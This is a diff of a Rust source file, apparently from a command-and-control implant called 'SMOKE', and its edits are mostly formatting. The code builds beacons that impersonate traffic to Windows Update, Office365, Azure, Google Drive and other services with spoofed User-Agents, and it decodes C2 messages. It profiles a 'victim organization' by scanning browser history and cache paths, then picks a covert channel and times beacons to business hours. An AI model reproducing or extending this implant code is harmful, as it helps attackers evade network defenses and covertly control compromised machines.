@@ -12,13 +12,13 @@ use uuid::Uuid;
 /// Service templates for traffic emulation.
 #[derive(Debug, Clone, PartialEq)]
 pub enum SmokeChannel {
-    WindowsUpdate,     // *.windowsupdate.com, *.update.microsoft.com
-    Office365,         // outlook.office365.com, *.sharepoint.com
-    AzureServiceBus,   // *.servicebus.windows.net (WebSocket)
-    GoogleDrive,       // *.googleapis.com/drive
-    GitHubActions,     // pipelines.actions.githubusercontent.com
-    ApplePush,         // *.push.apple.com
-    CloudFrontCDN,     // *.cloudfront.net
+    WindowsUpdate,   // *.windowsupdate.com, *.update.microsoft.com
+    Office365,       // outlook.office365.com, *.sharepoint.com
+    AzureServiceBus, // *.servicebus.windows.net (WebSocket)
+    GoogleDrive,     // *.googleapis.com/drive
+    GitHubActions,   // pipelines.actions.githubusercontent.com
+    ApplePush,       // *.push.apple.com
+    CloudFrontCDN,   // *.cloudfront.net
 }
 
 impl SmokeChannel {
@@ -51,9 +51,15 @@ impl SmokeChannel {
     /// Get typical User-Agent for this service.
     pub fn user_agent(&self) -> &str {
         match self {
-            SmokeChannel::WindowsUpdate => "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.40",
-            SmokeChannel::Office365 => "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)",
-            SmokeChannel::AzureServiceBus => "azsdk-net-Messaging.ServiceBus/7.11.0 (.NET 6.0.25; Windows 10.0.22621)",
+            SmokeChannel::WindowsUpdate => {
+                "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.40"
+            }
+            SmokeChannel::Office365 => {
+                "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)"
+            }
+            SmokeChannel::AzureServiceBus => {
+                "azsdk-net-Messaging.ServiceBus/7.11.0 (.NET 6.0.25; Windows 10.0.22621)"
+            }
             SmokeChannel::GoogleDrive => "grpc-node-js/1.8.14 grpc-c/30.0 (linux; chttp2)",
             SmokeChannel::GitHubActions => "GitHubActionsRunner/2.311.0 (Ubuntu 22.04)",
             SmokeChannel::ApplePush => "akd/1.0 CFNetwork/1410.0.3 Darwin/22.6.0",
@@ -129,7 +135,7 @@ impl SmokeChannel {
 /// Build a beacon payload disguised as legitimate service traffic.
 pub fn build_smoke_beacon(channel: &SmokeChannel, agent_data: &[u8]) -> Vec<u8> {
     let payload_b64 = base64_encode(agent_data);
-    
+
     match channel {
         SmokeChannel::WindowsUpdate => {
             format!(
@@ -178,8 +184,16 @@ fn base64_encode(data: &[u8]) -> String {
         let t = (b0 << 16) | (b1 << 8) | b2;
         s.push(CHARS[((t >> 18) & 0x3F) as usize] as char);
         s.push(CHARS[((t >> 12) & 0x3F) as usize] as char);
-        s.push(if chunk.len() > 1 { CHARS[((t >> 6) & 0x3F) as usize] as char } else { '=' });
-        s.push(if chunk.len() > 2 { CHARS[(t & 0x3F) as usize] as char } else { '=' });
+        s.push(if chunk.len() > 1 {
+            CHARS[((t >> 6) & 0x3F) as usize] as char
+        } else {
+            '='
+        });
+        s.push(if chunk.len() > 2 {
+            CHARS[(t & 0x3F) as usize] as char
+        } else {
+            '='
+        });
     }
     s
 }
@@ -226,13 +240,19 @@ pub struct SmokeDirector {
     round_robin_counter: AtomicUsize,
 }
 
-impl SmokeDirector {
-    /// Create a new empty director.
-    pub fn new() -> Self {
+impl Default for SmokeDirector {
+    fn default() -> Self {
         Self {
             channels: Vec::new(),
             round_robin_counter: AtomicUsize::new(0),
         }
+    }
+}
+
+impl SmokeDirector {
+    /// Create a new empty director.
+    pub fn new() -> Self {
+        Self::default()
     }
 
     /// Add a channel. Duplicate channels are silently ignored.
@@ -312,8 +332,8 @@ impl C2Message {
     /// Decode a base64 beacon payload and deserialize.
     pub fn from_beacon_payload(data: &[u8]) -> Result<Self, String> {
         let decoded = base64_decode(data)?;
-        let json_str = String::from_utf8(decoded)
-            .map_err(|e| format!("Invalid UTF-8 in payload: {}", e))?;
+        let json_str =
+            String::from_utf8(decoded).map_err(|e| format!("Invalid UTF-8 in payload: {}", e))?;
         serde_json::from_str(&json_str)
             .map_err(|e| format!("Failed to deserialize C2Message: {}", e))
     }
@@ -339,15 +359,15 @@ pub fn extract_c2_response(response: &[u8]) -> Option<C2Message> {
 /// Discovered cloud service fingerprint of the victim organization.
 #[derive(Debug, Clone, Default)]
 pub struct OrgCloudProfile {
-    pub google_workspace: bool,    // Uses Google Workspace
-    pub microsoft_365: bool,       // Uses Office 365 / Azure AD
-    pub aws: bool,                 // Uses AWS services
-    pub salesforce: bool,          // Uses Salesforce
-    pub slack: bool,               // Uses Slack
-    pub zoom: bool,                // Uses Zoom
+    pub google_workspace: bool,      // Uses Google Workspace
+    pub microsoft_365: bool,         // Uses Office 365 / Azure AD
+    pub aws: bool,                   // Uses AWS services
+    pub salesforce: bool,            // Uses Salesforce
+    pub slack: bool,                 // Uses Slack
+    pub zoom: bool,                  // Uses Zoom
     pub custom_domains: Vec<String>, // Custom SaaS domains observed
-    pub peak_hours: Vec<u8>,       // 24 slots: 0-23, count of traffic spikes
-    pub trusted_cdn: Vec<String>,  // CDNs in use (CloudFront, Fastly, etc.)
+    pub peak_hours: Vec<u8>,         // 24 slots: 0-23, count of traffic spikes
+    pub trusted_cdn: Vec<String>,    // CDNs in use (CloudFront, Fastly, etc.)
 }
 
 /// Analyze victim's DNS cache and network to learn their cloud profile.
@@ -387,8 +407,14 @@ pub fn learn_org_profile() -> OrgCloudProfile {
 
     // Check browser history for cloud URLs (Firefox/Chrome)
     let history_paths = [
-        format!("{}/.mozilla/firefox", std::env::var("HOME").unwrap_or_default()),
-        format!("{}/.config/google-chrome", std::env::var("HOME").unwrap_or_default()),
+        format!(
+            "{}/.mozilla/firefox",
+            std::env::var("HOME").unwrap_or_default()
+        ),
+        format!(
+            "{}/.config/google-chrome",
+            std::env::var("HOME").unwrap_or_default()
+        ),
     ];
     for hp in &history_paths {
         if std::path::Path::new(hp).exists() {
@@ -400,14 +426,17 @@ pub fn learn_org_profile() -> OrgCloudProfile {
     }
 
     // Detect CDNs by checking common cache headers in /tmp
-    let cdn_domains = ["cloudfront.net", "fastly.net", "azureedge.net", "cdn.jsdelivr.net"];
+    let cdn_domains = [
+        "cloudfront.net",
+        "fastly.net",
+        "azureedge.net",
+        "cdn.jsdelivr.net",
+    ];
     for cdn in &cdn_domains {
-        if std::path::Path::new(&format!("/var/cache/nginx/{}", cdn)).exists()
-            || {
-                let cache_path = format!("/tmp/.{}_cache", (*cdn).replace('.', "_"));
-                std::path::Path::new(&cache_path).exists()
-            }
-        {
+        if std::path::Path::new(&format!("/var/cache/nginx/{}", cdn)).exists() || {
+            let cache_path = format!("/tmp/.{}_cache", (*cdn).replace('.', "_"));
+            std::path::Path::new(&cache_path).exists()
+        } {
             profile.trusted_cdn.push(cdn.to_string());
         }
     }
@@ -417,8 +446,10 @@ pub fn learn_org_profile() -> OrgCloudProfile {
         profile.peak_hours.push(h);
     }
 
-    info!("SMOKE: learned org profile: Google={} M365={} AWS={} CDNs={:?}",
-        profile.google_workspace, profile.microsoft_365, profile.aws, profile.trusted_cdn);
+    info!(
+        "SMOKE: learned org profile: Google={} M365={} AWS={} CDNs={:?}",
+        profile.google_workspace, profile.microsoft_365, profile.aws, profile.trusted_cdn
+    );
 
     profile
 }
@@ -427,7 +458,11 @@ pub fn learn_org_profile() -> OrgCloudProfile {
 pub fn best_channel_for_org(profile: &OrgCloudProfile) -> SmokeChannel {
     if profile.microsoft_365 {
         // Random between Office365 and Azure
-        if rand::random() { SmokeChannel::Office365 } else { SmokeChannel::AzureServiceBus }
+        if rand::random() {
+            SmokeChannel::Office365
+        } else {
+            SmokeChannel::AzureServiceBus
+        }
     } else if profile.google_workspace {
         SmokeChannel::GoogleDrive
     } else if profile.aws || profile.trusted_cdn.contains(&"cloudfront.net".to_string()) {
@@ -459,14 +494,22 @@ mod tests {
 
     #[test]
     fn test_best_channel() {
-        let profile = OrgCloudProfile { microsoft_365: true, ..Default::default() };
+        let profile = OrgCloudProfile {
+            microsoft_365: true,
+            ..Default::default()
+        };
         let ch = best_channel_for_org(&profile);
-        assert!(matches!(ch, SmokeChannel::Office365) || matches!(ch, SmokeChannel::AzureServiceBus));
+        assert!(
+            matches!(ch, SmokeChannel::Office365) || matches!(ch, SmokeChannel::AzureServiceBus)
+        );
     }
 
     #[test]
     fn test_beacon_timing() {
-        let profile = OrgCloudProfile { peak_hours: vec![8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18], ..Default::default() };
+        let profile = OrgCloudProfile {
+            peak_hours: vec![8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18],
+            ..Default::default()
+        };
         let now = chrono::Local::now().hour() as u8;
         let should = should_beacon_now(&profile);
         info!("Beacon now (hour {}): {}", now, should);
@@ -515,7 +558,10 @@ mod tests {
 
         // Verify lab mode wrote beacon files
         let beacon_dir = std::path::Path::new("/tmp/smoke_beacons");
-        assert!(beacon_dir.exists(), "beacon directory should exist after beacon_all");
+        assert!(
+            beacon_dir.exists(),
+            "beacon directory should exist after beacon_all"
+        );
 
         // Verify at least one file was written (there could be more from parallel runs)
         let entries: Vec<_> = std::fs::read_dir(beacon_dir)
